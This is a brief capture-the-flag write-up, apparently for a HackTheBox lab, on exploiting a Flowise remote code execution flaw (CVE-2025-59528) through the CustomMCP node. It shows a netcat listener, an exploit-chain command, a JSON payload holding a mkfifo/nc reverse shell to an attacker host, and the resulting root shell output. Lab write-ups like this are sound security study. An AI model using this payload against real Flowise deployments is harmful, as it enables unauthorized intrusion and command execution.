## Remote Code Execution - CVE-2025-59528

### The Vulnerability

The CustomMCP node in Flowise takes user input and passes it directly into a Node.js `Function()` constructor. Anyone with a valid API key can run arbitrary system commands as whatever user the Flowise process is running as.

### Getting a Shell

Start a listener first:

```bash
nc -lvnp 443
```

The exploit chain from CVE-2025-58434-59528 automates all of this - it resets the password, logs in, grabs an API key, and fires the payload:

```bash
python3 flowise_chain.py \
  -t http://staging.silentium.htb \
  -e ben@silentium.htb
```

The payload it uses against the CustomMCP endpoint looks like this:

```json
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(()=>{process.mainModule.require(\"child_process\").exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST 443 >/tmp/f\");return 1;})()"
  }
}
```

We catch a shell:

```
connect to [10.10.14.21] from (UNKNOWN) [10.129.245.103]
/ # id
uid=0(root) gid=0(root) groups=0(root)
/ # hostname
c78c3cceb7ba
```

Root but inside Docker. The hostname is a container ID.

